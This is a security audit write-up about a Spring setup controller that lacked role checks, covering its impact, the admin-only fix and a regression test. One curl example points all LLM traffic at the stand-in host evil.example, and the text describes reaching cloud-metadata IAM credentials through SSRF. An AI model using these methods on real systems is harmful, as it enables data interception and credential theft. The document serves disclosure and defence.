# SetupController had no authorization

*Found 2026-09-10 in a repository-wide security audit. Severity: critical.*

## What was wrong

`SetupController` carried no authorization of any kind — no `@PreAuthorize`, no
`AccessControlService` call, nothing. `SecurityConfig` reaches it only through
`.anyRequest().authenticated()`, so **every authenticated user, including the lowest
role, could call all seven endpoints.**

Its own javadoc said:

> The `GET /setup/status` endpoint is publicly accessible (no auth required) so the
> frontend can detect first-run before login. All other endpoints require an
> authenticated user.

That sentence is *true*, which is what made it dangerous: it reads like a security
guarantee while describing only authentication. Authentication is not authorization —
the same trap `BrainController` already documents.

## Why it mattered

**1. Silent interception of all LLM traffic.** `POST /setup/llm-config` writes the
provider, endpoint and API key into `system_config`. `LlmConfigResolver.resolveChat()`
consults the **database tier before the environment tier**:

```java
public LlmCredentials resolveChat() {
    LlmCredentials db = fromDatabase("chat");
    if (db != null && !db.equals(invalidChatCredentials)) {
        return db;                       // ← wins over a correct env config
    }
    LlmCredentials fromEnv = fromEnvironment("CHAT");
```

So a low-privilege write silently overrode a correctly configured production install,
with no restart and no error. Every subsequent chat turn, dashboard build and embedding —
carrying schema, sampled rows and query results — would flow to a host of the caller's
choosing.

```bash
# as any DEVELOPER / DATA_ENGINEER / custom-role user
curl -b cookies.txt -X POST https://host/api/setup/llm-config \
  -H 'Content-Type: application/json' \
  -d '{"provider":"openai","apiKey":"sk-x","endpoint":"https://evil.example/v1"}'
```

**2. Server-side request forgery.** `POST /setup/llm-config/test` passed a caller-supplied
`endpoint` straight into `RestClient.baseUrl` with no scheme or host validation, reaching
cloud metadata (`169.254.169.254` → IAM credentials) and internal-only services. Its error
text is returned to the caller, making it a usable internal port-scan oracle.

`POST /setup/organization` and `POST /setup/complete` were likewise open.

## Why no existing test caught it

`ConnectionScopedAuthorizationSafetyTest` scans for handlers taking a `connectionId` or a
`@PathVariable …Id`, because its job is per-connection tenancy. `SetupController` takes
**neither** — its parameters are plain request bodies — so it was structurally invisible
and the suite reported green.

This is the general shape of the gap: a safety net keyed on one *kind* of vulnerability
gives no coverage of global-configuration endpoints, while producing a green check that
reads like full coverage.

## The fix

A class-level gate, with the two genuinely pre-login endpoints exempted explicitly:

```java
@RestController
@RequestMapping("/setup")
@PreAuthorize("hasRole('ADMIN')")
public class SetupController {

    @PreAuthorize("permitAll()")
    @GetMapping("/status")           // pre-login first-run probe

    @PreAuthorize("permitAll()")
    @PostMapping("/initialize")      // performs the first run, before any user exists
```

`@EnableMethodSecurity(prePostEnabled = true)` is already set in `SecurityConfig`, so the
annotation is enforced.

**No legitimate flow breaks.** The wizard lives at `/onboarding`, which is wrapped in
`<ProtectedRoute>` (`App.jsx:129`), and the first account is created by the bootstrap
endpoint as an **ADMIN**. The only person who reaches the wizard is therefore an
authenticated admin, who passes the gate. `/status` and `/initialize` keep `permitAll()`
and are unaffected.

## The regression test

`GlobalConfigAuthorizationSafetyTest` encodes the rule CLAUDE.md already states in prose —
*an endpoint with no connection scope at all is admin-only* — for the shape the existing
scanner cannot see. It is a source scan, like `CorsAllowlistSafetyTest`, so it needs no
database, Redis or LLM credentials.

Two details are load-bearing, both found by *testing the test* rather than reading it:

- **`@RequestMapping` is excluded from the handler pattern.** On these controllers it is
  the class-level base path, not an endpoint, and counting it produced a phantom offender
  (`"/setup"`) on the first run.
- **The class-level check matches an annotation in annotation position** (start of line),
  not `source.indexOf("@PreAuthorize")`. The first version used `indexOf`, and the
  `import` line plus a javadoc mention both sit above the class declaration — so deleting
  the real gate left the test **still green**. That false negative was caught only by
  removing the annotation and re-running; the existing
  `ConnectionScopedAuthorizationSafetyTest` is noted to have the same weakness.

A second test asserts the `PUBLIC_BY_DESIGN` exemptions are still in `SecurityConfig`'s
permitAll list, so the exemption cannot outlive the reason for it.

## Verification

| Step | Result |
|---|---|
| Test before fix (RED) | fails, naming 5 endpoints: `/organization`, `/llm-config` ×2, `/llm-config/test`, `/complete` |
| Test after fix (GREEN) | passes |
| Gate deleted (mutation) | test fails again — proves it guards the fix |
| All 5 safety tests | 23 tests, 0 failures |
| `mvn compile` | clean |

Run with:

```bash
cd backend && mvn test -Dtest=GlobalConfigAuthorizationSafetyTest
```

## Residual work

The SSRF in `/setup/llm-config/test` is now admin-only, which removes the privilege-
escalation half but not the primitive itself: an admin can still point the backend at an
internal address. A shared `OutboundUrlValidator` rejecting loopback, link-local and
private ranges after DNS resolution should be applied there and at the other outbound
sites (webhooks, Slack, connection creation). Tracked separately — it is a different fix
with a wider blast radius.
